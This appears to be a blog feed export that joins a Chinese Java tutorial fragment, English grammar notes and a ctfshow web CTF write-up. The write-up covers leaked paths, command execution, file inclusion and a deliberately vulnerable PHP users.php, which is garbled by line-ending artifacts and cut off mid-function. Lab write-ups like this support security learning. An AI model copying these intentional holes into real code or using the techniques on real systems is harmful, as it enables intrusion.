<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">Hello.java:1: 错误: 类 Demo 是公共的, 应在名为 Demo.java 的文件中声明</span><br><span class="line">public class Demo&#123;</span><br></pre></td></tr></table></figure></div>

<p>​    </p>
<p><strong>形式二</strong>：class类名称，由于使用class不要求类名称与文件名称保持一致，所以这个时候就可以再一个“*.java”源代码文件里面定义有若干个class。</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">class Demo&#123;</span><br><span class="line">	public static void main(String args[])&#123;</span><br><span class="line">		System.out.println(&quot;Hello world!&quot;);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>可以正常的编译通过</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">2020&#x2F;09&#x2F;19  08:38    &lt;DIR&gt;          .</span><br><span class="line">2020&#x2F;09&#x2F;19  08:38    &lt;DIR&gt;          ..</span><br><span class="line">2020&#x2F;09&#x2F;19  08:38               415 Demo.class</span><br><span class="line">2020&#x2F;09&#x2F;19  08:38                99 Hello.java</span><br><span class="line">2020&#x2F;09&#x2F;19  08:34               106 Hello.java.bak</span><br><span class="line">               3 个文件            620 字节</span><br><span class="line">               2 个目录 130,474,803,200 可用字节</span><br></pre></td></tr></table></figure></div>

<p>此时生成的是Demo.class，也就是说这个时候是根据class类名称来定义的生成的“*.class”文件名称</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">D:\yootk&gt;java Demo</span><br><span class="line">Hello world!</span><br></pre></td></tr></table></figure></div>

<p>此时得使用Java Demo 才可以正常执行Hello程序。</p>
<p><strong>主方法</strong>：主方法是一个程序的起点，所有的程序都是通过主方法去执行的，在Java里面住主方法定义比较长：</p>
<p><strong>官方推荐：</strong></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">public static void main(String args[])、public static void main(String [] args)</span><br></pre></td></tr></table></figure></div>

<p><strong>个性化定义：</strong></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">public static void main(String yootk[])</span><br></pre></td></tr></table></figure></div>

<p>考虑 后期学习对于知识层次的讲解，所以对于主方法的定义有一个明确的说明：把主方法所在的类将其称为“主类（MainClass）”，而主类全部使用“public class”来进行声明，后面的代码里面主类名称就是文件名称。</p>
<p>屏幕输出：</p>
<p>【输出后追加换行】System.out.println()、</p>
<p>【输出后不追加换行】System.out.print()</p>
]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>知识拓展</tag>
      </tags>
  </entry>
  <entry>
    <title>特殊用途的句子</title>
    <url>/posts/3.html</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="强调句"><a href="#强调句" class="headerlink" title="强调句"></a>强调句</h1><p>句型It is …… that ……</p>
<p>I want to go to America this summer.</p>
<p>It is America that I want to go to this summer. </p>
<h1 id="倒装句"><a href="#倒装句" class="headerlink" title="倒装句"></a>倒装句</h1><p><strong>全部倒装</strong>：<strong>There be 句型 + n + 介词短语</strong></p>
<p>有……在哪里</p>
<p>现在 There is a book on the table.</p>
<p><strong>部分倒装</strong></p>
<p>相当于把陈述句变成一般疑问句</p>
<p><strong>否定词 位于句首</strong></p>
<blockquote>
<p>not、no、never、hardly、little、scarcely、seldom、not until、not only……</p>
</blockquote>
<p>I will never do it.</p>
<p>never will I do it.</p>
<p><strong>only 位于句首</strong></p>
<h1 id="虚拟语气（非真实）"><a href="#虚拟语气（非真实）" class="headerlink" title="虚拟语气（非真实）"></a>虚拟语气（非真实）</h1><p>1、不是真的。</p>
<p>2、改变时态</p>
<p>3、虚拟条件句、名词性从句中</p>
<h3 id="if虚拟条件句"><a href="#if虚拟条件句" class="headerlink" title="if虚拟条件句"></a>if虚拟条件句</h3><table>
<thead>
<tr>
<th></th>
<th>if从句</th>
<th>主句</th>
</tr>
</thead>
<tbody><tr>
<td>假设过去</td>
<td>had done</td>
<td>would +have done</td>
</tr>
<tr>
<td>假设现在</td>
<td>did(were)</td>
<td>could、should+do</td>
</tr>
<tr>
<td>假设未来</td>
<td>did(were)<br />were to do <br />should do</td>
<td>might + do</td>
</tr>
</tbody></table>
<p>If I were to have/had/should have time tomorrow, I would help him.</p>
<p><img src="https://s1.ax1x.com/2020/08/19/dlySJ0.png" alt="image"></p>
<p>如果你过去嫁给他，你现在就会是一个加油站服务员的妻子</p>
<p>If you had married him, you would be the wife of a gas station attendant.</p>
<h3 id="省略if的虚拟条件句"><a href="#省略if的虚拟条件句" class="headerlink" title="省略if的虚拟条件句"></a>省略if的虚拟条件句</h3><p>if you had joined us, we would have had more fun.</p>
<p>had you joined us, we would have had more fun. (部分倒装)</p>
<h3 id="名词性从句的虚拟语气"><a href="#名词性从句的虚拟语气" class="headerlink" title="名词性从句的虚拟语气"></a>名词性从句的虚拟语气</h3><p>表示“建议，要求，命令”v.后的宾语从句虚拟</p>
<p>从句中用（should）+ do</p>
<p>He suggested that the system should be changed.</p>
<blockquote>
<p>suggest,advise,propose,recommend,</p>
<p>order,ask,demand,insist,</p>
<p>require,request……</p>
</blockquote>
]]></content>
      <categories>
        <category>知识积累</category>
      </categories>
      <tags>
        <tag>英语四级</tag>
      </tags>
  </entry>
  <entry>
    <title>【ctfshow】web篇-终极考核 wp</title>
    <url>/posts/117.html</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><blockquote>
<p>记录web的题目wp，慢慢变强，铸剑。</p>
</blockquote>
<h1 id="终极考核"><a href="#终极考核" class="headerlink" title="终极考核"></a>终极考核</h1><h2 id="web640"><a href="#web640" class="headerlink" title="web640"></a>web640</h2><blockquote>
<p>进去就可以直接拿</p>
</blockquote>
<h2 id="web641"><a href="#web641" class="headerlink" title="web641"></a>web641</h2><blockquote>
<p>头文件泄露</p>
</blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210828190118537.png" alt="image-20210828190118537"></p>
<h2 id="web642"><a href="#web642" class="headerlink" title="web642"></a>web642</h2><blockquote>
<p>查看源码，访问敏感路径，在返回包中</p>
</blockquote>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">&#x2F;system36d&#x2F;static&#x2F;css&#x2F;start.css</span><br></pre></td></tr></table></figure></div>

<p>访问/system36d/得到flag</p>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210828190517170.png" alt="image-20210828190517170"></p>
</blockquote>
<h2 id="web643"><a href="#web643" class="headerlink" title="web643"></a>web643</h2><blockquote>
<p>在得到645之后会说</p>
</blockquote>
<h2 id="web644"><a href="#web644" class="headerlink" title="web644"></a>web644</h2><blockquote>
<p>通过登录页面的源码，找到敏感信息中包含flag</p>
</blockquote>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">&#x2F;system36d&#x2F;login.php</span><br></pre></td></tr></table></figure></div>

<p>在源码中发现了，其中有flag，和登录密码</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">&#x2F;system36d&#x2F;static&#x2F;js&#x2F;lock&#x2F;index.js</span><br></pre></td></tr></table></figure></div>

<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210828190718909.png" alt="image-20210828190718909"></p>
</blockquote>
<h2 id="web645"><a href="#web645" class="headerlink" title="web645"></a>web645</h2><blockquote>
<p>在数据库备份中</p>
</blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210828190924891.png" alt="image-20210828190924891">接着可以看到命令执行的窗口抓包，执行ls，可以看到secret.txt访问就得到，url解码</p>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210828212750616.png" alt="image-20210828212750616"></p>
</blockquote>
<h2 id="web646"><a href="#web646" class="headerlink" title="web646"></a>web646</h2><p>接着在远程更新抓包，发现了一个文件包含漏洞，一个个文件的包含，可以看到init.php中有646</p>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210828215410374.png" alt="image-20210828215410374"></p>
</blockquote>
<p>接着查看checklogin.php得到</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line">$_GET[<span class="string">'s'</span>];</span><br><span class="line">setcookie(<span class="string">'uid'</span>,intval($s));</span><br><span class="line">$_SESSION[<span class="string">'user_id'</span>]=intval($s);</span><br><span class="line">header(<span class="string">'location:main.php'</span>);</span><br></pre></td></tr></table></figure></div>

<p>接着查看users.php得到源码</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line">session_start();r</span><br><span class="line"><span class="keyword">include</span> <span class="string">'init.php'</span>;r</span><br><span class="line">r</span><br><span class="line">$a=$_GET[<span class="string">'action'</span>];r</span><br><span class="line">r</span><br><span class="line">r</span><br><span class="line">$data = file_get_contents(DB_PATH);r</span><br><span class="line">$ret = <span class="string">''</span>;r</span><br><span class="line"><span class="keyword">switch</span> ($a) &#123;r</span><br><span class="line">	<span class="keyword">case</span> <span class="string">'list'</span>:r</span><br><span class="line">		$ret = getUsers($data,intval($_GET[<span class="string">'page'</span>]),intval($_GET[<span class="string">'limit'</span>]));r</span><br><span class="line">		<span class="keyword">break</span>;r</span><br><span class="line">	<span class="keyword">case</span> <span class="string">'add'</span>:r</span><br><span class="line">		$ret = addUser($data,$_GET[<span class="string">'username'</span>],$_GET[<span class="string">'password'</span>]);r</span><br><span class="line">		<span class="keyword">break</span>;r</span><br><span class="line">	<span class="keyword">case</span> <span class="string">'del'</span>:r</span><br><span class="line">		$ret = delUser($data,$_GET[<span class="string">'username'</span>]);r</span><br><span class="line">		<span class="keyword">break</span>;r</span><br><span class="line">	<span class="keyword">case</span> <span class="string">'update'</span>:r</span><br><span class="line">		$ret = updateUser($data,$_GET[<span class="string">'username'</span>],$_GET[<span class="string">'password'</span>]);r</span><br><span class="line">		<span class="keyword">break</span>;r</span><br><span class="line">	<span class="keyword">case</span> <span class="string">'backup'</span>:r</span><br><span class="line">		backupUsers();r</span><br><span class="line">		<span class="keyword">break</span>;r</span><br><span class="line">	<span class="keyword">case</span> <span class="string">'upload'</span>:r</span><br><span class="line">		$ret = recoveryUsers();r</span><br><span class="line">		<span class="keyword">break</span>;r</span><br><span class="line">	<span class="keyword">case</span> <span class="string">'phpInfo'</span>:r</span><br><span class="line">		$ret = phpInfoTest();r</span><br><span class="line">		<span class="keyword">break</span>;r</span><br><span class="line">	<span class="keyword">case</span> <span class="string">'netTest'</span>:r</span><br><span class="line">		$ret = netTest($_GET[<span class="string">'cmd'</span>]);r</span><br><span class="line">		<span class="keyword">break</span>;r</span><br><span class="line">	<span class="keyword">case</span> <span class="string">'remoteUpdate'</span>:r</span><br><span class="line">		$ret = remoteUpdate($_GET[<span class="string">'auth'</span>],$_GET[<span class="string">'update_address'</span>]);r</span><br><span class="line">		<span class="keyword">break</span>;r</span><br><span class="line">	<span class="keyword">case</span> <span class="string">'authKeyValidate'</span>:r</span><br><span class="line">		$ret = authKeyValidate($_GET[<span class="string">'auth'</span>]);r</span><br><span class="line">		<span class="keyword">break</span>;r</span><br><span class="line">	<span class="keyword">case</span> <span class="string">'evilString'</span>:r</span><br><span class="line">		evilString($_GET[<span class="string">'m'</span>]);r</span><br><span class="line">		<span class="keyword">break</span>;r</span><br><span class="line">	<span class="keyword">case</span> <span class="string">'evilNumber'</span>:r</span><br><span class="line">		evilNumber($_GET[<span class="string">'m'</span>],$_GET[<span class="string">'key'</span>]);r</span><br><span class="line">		<span class="keyword">break</span>;r</span><br><span class="line">	<span class="keyword">case</span> <span class="string">'evilFunction'</span>:r</span><br><span class="line">		evilFunction($_GET[<span class="string">'m'</span>],$_GET[<span class="string">'key'</span>]);r</span><br><span class="line">		<span class="keyword">break</span>;r</span><br><span class="line">	<span class="keyword">case</span> <span class="string">'evilArray'</span>:r</span><br><span class="line">		evilArray($_GET[<span class="string">'m'</span>],$_GET[<span class="string">'key'</span>]);r</span><br><span class="line">		<span class="keyword">break</span>;r</span><br><span class="line">	<span class="keyword">case</span> <span class="string">'evilClass'</span>:r</span><br><span class="line">		evilClass($_GET[<span class="string">'m'</span>],$_GET[<span class="string">'key'</span>]);r</span><br><span class="line">		<span class="keyword">break</span>;r</span><br><span class="line">	<span class="keyword">default</span>:r</span><br><span class="line">		$ret = json_encode(<span class="keyword">array</span>(r</span><br><span class="line">		<span class="string">'code'</span>=&gt;<span class="number">0</span>,r</span><br><span class="line">		<span class="string">'message'</span>=&gt;<span class="string">'\u6570\u636e\u83b7\u53d6\u5931\u8d25'</span>,r</span><br><span class="line">		));r</span><br><span class="line">		<span class="keyword">break</span>;r</span><br><span class="line">&#125;r</span><br><span class="line">r</span><br><span class="line"><span class="keyword">echo</span> $ret;r</span><br><span class="line">r</span><br><span class="line">r</span><br><span class="line">r</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getUsers</span><span class="params">($data,$page=<span class="number">1</span>,$limit=<span class="number">10</span>)</span></span>&#123;r</span><br><span class="line">	$ret = <span class="keyword">array</span>(r</span><br><span class="line">		<span class="string">'code'</span>=&gt;<span class="number">0</span>,r</span><br><span class="line">		<span class="string">'message'</span>=&gt;<span class="string">'\u6570\u636e\u83b7\u53d6\u6210\u529f'</span>,r</span><br><span class="line">		<span class="string">'data'</span>=&gt;<span class="keyword">array</span>()r</span><br><span class="line">	);r</span><br><span class="line">r</span><br><span class="line">	r</span><br><span class="line">	$isadmin = <span class="string">'\u5426'</span>;r</span><br><span class="line">	$pass = <span class="string">''</span>;r</span><br><span class="line">	$content=<span class="string">'\u65e0'</span>;r</span><br><span class="line">r</span><br><span class="line">	$users = explode(<span class="string">'|'</span>, $data);r</span><br><span class="line">	array_pop($users);r</span><br><span class="line">	$index = <span class="number">1</span>;r</span><br><span class="line">r</span><br><span class="line">	<span class="keyword">foreach</span> ($users <span class="keyword">as</span> $u) &#123;r</span><br><span class="line">		<span class="keyword">if</span>(explode(<span class="string">'@'</span>, $u)[<span class="number">0</span>]==<span class="string">'admin'</span>)&#123;r</span><br><span class="line">			$isadmin = <span class="string">'\u662f'</span>;r</span><br><span class="line">			$pass = <span class="string">'flag\u5c31\u662f\u7ba1\u7406\u5458\u7684\u5bc6\u7801\uff0c\u4e0d\u8fc7\u6211\u9690\u85cf\u4e86'</span>;r</span><br><span class="line">			$content = <span class="string">'\u5220\u9664\u6b64\u6761\u8bb0\u5f55\u540eflag\u5c31\u4f1a\u6d88\u5931'</span>;r</span><br><span class="line">		&#125;<span class="keyword">else</span>&#123;r</span><br><span class="line">			$pass = explode(<span class="string">'@'</span>, $u)[<span class="number">1</span>];r</span><br><span class="line">		&#125;r</span><br><span class="line">		array_push($ret[<span class="string">'data'</span>], <span class="keyword">array</span>(r</span><br><span class="line">			<span class="string">'id'</span>=&gt;$index,r</span><br><span class="line">			<span class="string">'username'</span>=&gt;explode(<span class="string">'@'</span>, $u)[<span class="number">0</span>],r</span><br><span class="line">			<span class="string">'password'</span>=&gt;$pass,r</span><br><span class="line">			<span class="string">'isAdmin'</span>=&gt;$isadmin,r</span><br><span class="line">			<span class="string">'content'</span>=&gt;$contentr</span><br><span class="line">		));r</span><br><span class="line">		$index +=<span class="number">1</span>;r</span><br><span class="line">	&#125;r</span><br><span class="line">	$ret[<span class="string">'count'</span>]=$index;r</span><br><span class="line">	$start = ($page<span class="number">-1</span>)*$limit;r</span><br><span class="line">	$ret[<span class="string">'data'</span>]=array_slice($ret[<span class="string">'data'</span>], $start,$limit,<span class="keyword">true</span>);r</span><br><span class="line">r</span><br><span class="line">	<span class="keyword">return</span> json_encode($ret);r</span><br><span class="line">r</span><br><span class="line">&#125;r</span><br><span class="line">r</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">addUser</span><span class="params">($data,$username,$password)</span></span>&#123;r</span><br><span class="line">	$ret = <span class="keyword">array</span>(r</span><br><span class="line">		<span class="string">'code'</span>=&gt;<span class="number">0</span>,r</span><br><span class="line">		<span class="string">'message'</span>=&gt;<span class="string">'\u6dfb\u52a0\u6210\u529f'</span>r</span><br><span class="line">	);r</span><br><span class="line">	<span class="keyword">if</span>(existsUser($data,$username)==<span class="number">0</span>)&#123;r</span><br><span class="line">		$s = $data.$username.<span class="string">'@'</span>.$password.<span class="string">'|'</span>;r</span><br><span class="line">		file_put_contents(DB_PATH, $s);r</span><br><span class="line">r</span><br><span class="line">	&#125;<span class="keyword">else</span>&#123;r</span><br><span class="line">		$ret[<span class="string">'code'</span>]=<span class="number">-1</span>;r</span><br><span class="line">		$ret[<span class="string">'message'</span>]=<span class="string">'\u7528\u6237\u5df2\u5b58\u5728'</span>;r</span><br><span class="line">	&#125;r</span><br><span class="line">r</span><br><span class="line">	<span class="keyword">return</span> json_encode($ret);r</span><br><span class="line">&#125;r</span><br><span class="line">r</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">updateUser</span><span class="params">($data,$username,$password)</span></span>&#123;r</span><br><span class="line">	$ret = <span class="keyword">array</span>(r</span><br><span class="line">		<span class="string">'code'</span>=&gt;<span class="number">0</span>,r</span><br><span class="line">		<span class="string">'message'</span>=&gt;<span class="string">'\u66f4\u65b0\u6210\u529f'</span>r</span><br><span class="line">	);r</span><br><span class="line">	<span class="keyword">if</span>(existsUser($data,$username)&gt;<span class="number">0</span> &amp;&amp; $username!=<span class="string">'admin'</span>)&#123;r</span><br><span class="line">		$s = preg_replace(<span class="string">'\/'</span>.$username.<span class="string">'@[0-9a-zA-Z]+\\|\/'</span>, $username.<span class="string">'@'</span>.$password.<span class="string">'|'</span>, $data);r</span><br><span class="line">		file_put_contents(DB_PATH, $s);r</span><br><span class="line">r</span><br><span class="line">	&#125;<span class="keyword">else</span>&#123;r</span><br><span class="line">		$ret[<span class="string">'code'</span>]=<span class="number">-1</span>;r</span><br><span class="line">		$ret[<span class="string">'message'</span>]=<span class="string">'\u7528\u6237\u4e0d\u5b58\u5728\u6216\u65e0\u6743\u66f4\u65b0'</span>;r</span><br><span class="line">	&#125;r</span><br><span class="line">r</span><br><span class="line">	<span class="keyword">return</span> json_encode($ret);r</span><br><span class="line">&#125;r</span><br><span class="line">r</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">delUser</span><span class="params">($data,$username)</span></span>&#123;r</span><br><span class="line">	$ret = <span class="keyword">array</span>(r</span><br><span class="line">		<span class="string">'code'</span>=&gt;<span class="number">0</span>,r</span><br><span class="line">		<span class="string">'message'</span>=&gt;<span class="string">'\u5220\u9664\u6210\u529f'</span>r</span><br><span class="line">	);r</span><br><span class="line">	<span class="keyword">if</span>(existsUser($data,$username)&gt;<span class="number">0</span> &amp;&amp; $username!=<span class="string">'admin'</span>)&#123;r</span><br><span class="line">		$s = preg_replace(<span class="string">'\/'</span>.$username.<span class="string">'@[0-9a-zA-Z]+\\|\/'</span>, <span class="string">''</span>, $data);r</span><br><span class="line">		file_put_contents(DB_PATH, $s);r</span><br><span class="line">r</span><br><span class="line">	&#125;<span class="keyword">else</span>&#123;r</span><br><span class="line">		$ret[<span class="string">'code'</span>]=<span class="number">-1</span>;r</span><br><span class="line">		$ret[<span class="string">'message'</span>]=<span class="string">'\u7528\u6237\u4e0d\u5b58\u5728\u6216\u65e0\u6743\u5220\u9664'</span>;r</span><br><span class="line">	&#125;r</span><br><span class="line">r</span><br><span class="line">	<span class="keyword">return</span> json_encode($ret);r</span><br><span class="line">r</span><br><span class="line">&#125;r</span><br><span class="line">r</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">existsUser</span><span class="params">($data,$username)</span></span>&#123;r</span><br><span class="line">	<span class="keyword">return</span> preg_match(<span class="string">'\/'</span>.$username.<span class="string">'@[0-9a-zA-Z]+\\|\/'</span>, $data);r</span><br><span class="line">&#125;r</span><br><span class="line">r</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">backupUsers</span><span class="params">()</span></span>&#123;r</span><br><span class="line">	$file_name = DB_PATH;r</span><br><span class="line">	<span class="keyword">if</span> (! file_exists ($file_name )) &#123;    r</span><br><span class="line">	    header(<span class="string">'HTTP\/1.1 404 NOT FOUND'</span>);  r</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;    r</span><br><span class="line">	    $file = fopen ($file_name, \<span class="string">"rb\" ); r</span></span><br><span class="line"><span class="string">	    Header ( \"Content-type: application\/octet-stream\" ); r</span></span><br><span class="line"><span class="string">	    Header ( \"Accept-Ranges: bytes\" );  r</span></span><br><span class="line"><span class="string">	    Header ( \"Accept-Length: \" . filesize ($file_name));  r</span></span><br><span class="line"><span class="string">	    Header ( \"Content-Disposition: attachment; filename=backup.dat\");     r</span></span><br><span class="line"><span class="string">	    echo str_replace(FLAG645, 'flag\u5c31\u5728\u8fd9\u91cc\uff0c\u53ef\u60dc\u4e0d\u80fd\u7ed9\u4f60', fread ( $file, filesize ($file_name)));    r</span></span><br><span class="line"><span class="string">	    fclose ( $file );    r</span></span><br><span class="line"><span class="string">	    exit ();    r</span></span><br><span class="line"><span class="string">	&#125;r</span></span><br><span class="line"><span class="string">&#125;r</span></span><br><span class="line"><span class="string">r</span></span><br><span class="line"><span class="string">function getArray($total, $times, $min, $max)r</span></span><br><span class="line"><span class="string">    &#123;r</span></span><br><span class="line"><span class="string">        $data = array();r</span></span><br><span class="line"><span class="string">        if ($min * $times &gt; $total) &#123;r</span></span><br><span class="line"><span class="string">            return array();r</span></span><br><span class="line"><span class="string">        &#125;r</span></span><br><span class="line"><span class="string">        if ($max * $times &lt; $total) &#123;r</span></span><br><span class="line"><span class="string">            return array();r</span></span><br><span class="line"><span class="string">        &#125;r</span></span><br><span class="line"><span class="string">        while ($times &gt;= 1) &#123;r</span></span><br><span class="line"><span class="string">            $times--;r</span></span><br><span class="line"><span class="string">            $kmix = max($min, $total - $times * $max);r</span></span><br><span class="line"><span class="string">            $kmax = min($max, $total - $times * $min);r</span></span><br><span class="line"><span class="string">            $kAvg = $total \/ ($times + 1);r</span></span><br><span class="line"><span class="string">            $kDis = min($kAvg - $kmix, $kmax - $kAvg);r</span></span><br><span class="line"><span class="string">            $r = ((float)(rand(1, 10000) \/ 10000) - 0.5) * $kDis * 2;r</span></span><br><span class="line"><span class="string">            $k = round($kAvg + $r);r</span></span><br><span class="line"><span class="string">            $total -= $k;r</span></span><br><span class="line"><span class="string">            $data[] = $k;r</span></span><br><span class="line"><span class="string">        &#125;r</span></span><br><span class="line"><span class="string">        return $data;r</span></span><br><span class="line"><span class="string"> &#125;r</span></span><br><span class="line"><span class="string">r</span></span><br><span class="line"><span class="string">r</span></span><br><span class="line"><span class="string">function recoveryUsers()&#123;r</span></span><br><span class="line"><span class="string">	$ret = array(r</span></span><br><span class="line"><span class="string">		'code'=&gt;0,r</span></span><br><span class="line"><span class="string">		'message'=&gt;'\u6062\u590d\u6210\u529f'r</span></span><br><span class="line"><span class="string">	);r</span></span><br><span class="line"><span class="string">	if(isset($_FILES['file']) &amp;&amp; $_FILES['file']['size']&lt;1024*1024)&#123;r</span></span><br><span class="line"><span class="string">		$file_name= $_FILES['file']['tmp_name'];r</span></span><br><span class="line"><span class="string">		$result = move_uploaded_file($file_name, DB_PATH);r</span></span><br><span class="line"><span class="string">		if($result===false)&#123;r</span></span><br><span class="line"><span class="string">			$ret['message']='\u6570\u636e\u6062\u590d\u5931\u8d25 file_name'.$file_name.' DB_PATH='.DB_PATH;r</span></span><br><span class="line"><span class="string">		&#125;r</span></span><br><span class="line"><span class="string">r</span></span><br><span class="line"><span class="string">	&#125;else&#123;r</span></span><br><span class="line"><span class="string">		$ret['message']='\u6570\u636e\u6062\u590d\u5931\u8d25';r</span></span><br><span class="line"><span class="string">	&#125;r</span></span><br><span class="line"><span class="string">r</span></span><br><span class="line"><span class="string">	return json_encode($ret);r</span></span><br><span class="line"><span class="string">&#125;r</span></span><br><span class="line"><span class="string">r</span></span><br><span class="line"><span class="string">function phpInfoTest()&#123;r</span></span><br><span class="line"><span class="string">	return phpinfo();r</span></span><br><span class="line"><span class="string">r</span></span><br><span class="line"><span class="string">&#125;r</span></span><br><span class="line"><span class="string">r</span></span><br><span class="line"><span class="string">function authKeyValidate($auth)&#123;r</span></span><br><span class="line"><span class="string">	$ret = array(r</span></span><br><span class="line"><span class="string">		'code'=&gt;0,r</span></span><br><span class="line"><span class="string">		'message'=&gt;$auth==substr(FLAG645, 8)?'\u9a8c\u8bc1\u6210\u529f':'\u9a8c\u8bc1\u5931\u8d25',r</span></span><br><span class="line"><span class="string">		'status'=&gt;$auth==substr(FLAG645, 8)?'0':'-1'r</span></span><br><span class="line"><span class="string">	);r</span></span><br><span class="line"><span class="string">	return json_encode($ret);r</span></span><br><span class="line"><span class="string">&#125;r</span></span><br><span class="line"><span class="string">r</span></span><br><span class="line"><span class="string">function remoteUpdate($auth,$address)&#123;r</span></span><br><span class="line"><span class="string">	$ret = array(r</span></span><br><span class="line"><span class="string">		'code'=&gt;0,r</span></span><br><span class="line"><span class="string">		'message'=&gt;'\u66f4\u65b0\u5931\u8d25'r</span></span><br><span class="line"><span class="string">	);r</span></span><br><span class="line"><span class="string">r</span></span><br><span class="line"><span class="string">	if($auth!==substr(FLAG645, 8))&#123;r</span></span><br><span class="line"><span class="string">		$ret['message']='\u6743\u9650key\u9a8c\u8bc1\u5931\u8d25';r</span></span><br><span class="line"><span class="string">		return json_encode($ret);r</span></span><br><span class="line"><span class="string">	&#125;else&#123;r</span></span><br><span class="line"><span class="string">		$content = file_get_contents($address);r</span></span><br><span class="line"><span class="string">		$ret['message']=($content!==false?$content:'\u5730\u5740\u4e0d\u53ef\u8fbe');r</span></span><br><span class="line"><span class="string">	&#125;r</span></span><br><span class="line"><span class="string">r</span></span><br><span class="line"><span class="string">	return json_encode($ret);r</span></span><br><span class="line"><span class="string">r</span></span><br><span class="line"><span class="string">r</span></span><br><span class="line"><span class="string">&#125;r</span></span><br><span class="line"><span class="string">r</span></span><br><span class="line"><span class="string">function evilString($m)&#123;r</span></span><br><span class="line"><span class="string">	$key = '372619038';r</span></span><br><span class="line"><span class="string">	$content = call_user_func($m);r</span></span><br><span class="line"><span class="string">	if(stripos($content, $key)!==FALSE)&#123;r</span></span><br><span class="line"><span class="string">		echo shell_exec('cat \/FLAG\/FLAG647');r</span></span><br><span class="line"><span class="string">	&#125;else&#123;r</span></span><br><span class="line"><span class="string">		echo 'you are not 372619038?';r</span></span><br><span class="line"><span class="string">	&#125;r</span></span><br><span class="line"><span class="string">r</span></span><br><span class="line"><span class="string">&#125;r</span></span><br><span class="line"><span class="string">r</span></span><br><span class="line"><span class="string">function evilClass($m,$k)&#123;r</span></span><br><span class="line"><span class="string">	class ctfshow&#123;r</span></span><br><span class="line"><span class="string">		public $m;r</span></span><br><span class="line"><span class="string">		public function construct($m)&#123;r</span></span><br><span class="line"><span class="string">			$this-&gt;$m=$m;r</span></span><br><span class="line"><span class="string">		&#125;r</span></span><br><span class="line"><span class="string">	&#125;r</span></span><br><span class="line"><span class="string">r</span></span><br><span class="line"><span class="string">	$ctfshow=new ctfshow($m);r</span></span><br><span class="line"><span class="string">	$ctfshow-&gt;$m=$m;r</span></span><br><span class="line"><span class="string">	if($ctfshow-&gt;$m==$m &amp;&amp; $k==shell_exec('cat \/FLAG\/FLAG647'))&#123;r</span></span><br><span class="line"><span class="string">		echo shell_exec('cat \/FLAG\/FLAG648');r</span></span><br><span class="line"><span class="string">	&#125;else&#123;r</span></span><br><span class="line"><span class="string">		echo 'mmmmm?';r</span></span><br><span class="line"><span class="string">	&#125;r</span></span><br><span class="line"><span class="string">r</span></span><br><span class="line"><span class="string">&#125;r</span></span><br><span class="line"><span class="string">r</span></span><br><span class="line"><span class="string">function evilNumber($m,$k)&#123;r</span></span><br><span class="line"><span class="string">	$number = getArray(1000,20,10,999);r</span></span><br><span class="line"><span class="string">	if($number[$m]==$m &amp;&amp; $k==shell_exec('cat \/FLAG\/FLAG648'))&#123;r</span></span><br><span class="line"><span class="string">		echo shell_exec('cat \/FLAG\/FLAG649');r</span></span><br><span class="line"><span class="string">	&#125;else&#123;r</span></span><br><span class="line"><span class="string">		echo 'number 